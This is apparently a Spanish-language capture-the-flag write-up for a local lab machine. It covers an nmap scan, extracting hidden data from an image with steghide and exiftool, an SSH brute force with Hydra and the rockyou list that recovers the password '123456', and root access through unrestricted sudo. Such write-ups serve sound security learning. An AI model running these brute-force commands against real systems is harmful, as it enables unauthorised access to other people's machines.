# Herramientas
- Nmap
- Steghide
- exiftool
- Hydra
# Procedimiento
Escaneamos con nmap y vemos que están los puertos 22 y 80 abiertos. Al entrar a la página, nos encontramos un kinder sorpresa:
![[Pasted image 20250715153547.png]]

Probamos un ataque de fuerza bruta con el usuario `kinder` y `sorpresa`, pero se ve que no hay ningún resultado con ambos.  Intentamos con huevo y chocolate. Sin embargo, tenemos el mismo resultado. 

Es por esto que debemos pensar, quizás en la imagen hay algo más... ¿no?
La descargamos y procedemos a hacer esteganografía.

Para poder ver el secreto que tiene la imagen, debemos ocupar el comando
```
steghide extract -f imagen.jpeg
```

Y nos mostrará `wrote extracted data to "secreto.txt"`
```
cat secreto.txt    
Sigue buscando, aquí no está to solución  
aunque te dejo una pista....  
sigue buscando en la imagen!!!
```

Ocupamos el comando `exiftool` para ver los metadatos de la imagen, y nos muestra el usuario. Como no tenemos nada más, hacemos fuerza bruta con hydra:
```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2  
  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-  
binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-15 15:54:16  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task  
[DATA] attacking ssh://172.17.0.2:22/  
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456  
1 of 1 target successfully completed, 1 valid password found  
[WARNING] Writing restore file because 5 final worker threads did not complete until end.  
[ERROR] 5 targets did not resolve or could not be connected  
[ERROR] 0 target did not complete  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-15 15:54:22
```

Y así podemos obtener acceso a la máquina, con el usuario `borazuwarah` y contraseña `123456`.

Vemos que con `sudo -l` se puede hacer todas las acciones en modo root introduciendo la misma contraseña, así que podemos hacer escalado de privilegios sin mayor problema, comprobando con `whoami`.